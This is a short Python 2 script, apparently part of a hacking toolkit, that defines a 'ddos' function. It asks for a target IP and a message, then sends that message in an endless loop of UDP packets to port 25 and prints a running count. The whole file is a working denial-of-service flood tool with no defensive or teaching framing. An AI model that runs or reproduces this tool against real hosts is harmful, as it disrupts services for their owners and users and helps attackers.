#!usr/bin/env python

import os
import sys
import socket
from termcolor import colored




def ddosm():
   send =  colored("\n\033[92m[\033[91mddos\033[92m]\033[93m$> ")
   getrekt = raw_input(send+"\n\t\033[92m Enter target IP \033[91m:")
   portrekt =25
   lastwreck = raw_input("\n\t\033[92m Message to send \033[91m:")

   print "Bombing UDP packets %s on port %s" % (getrekt, portrekt)
   sent = 0
   while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(lastwreck, (getrekt, portrekt))
        sent = sent + 1
        print "\033[1;92mSent \033[91m%s \033[92mUDP packets against \033[91m%s \033[92mon port \033[91m%s" % (sent, getrekt, portrekt)

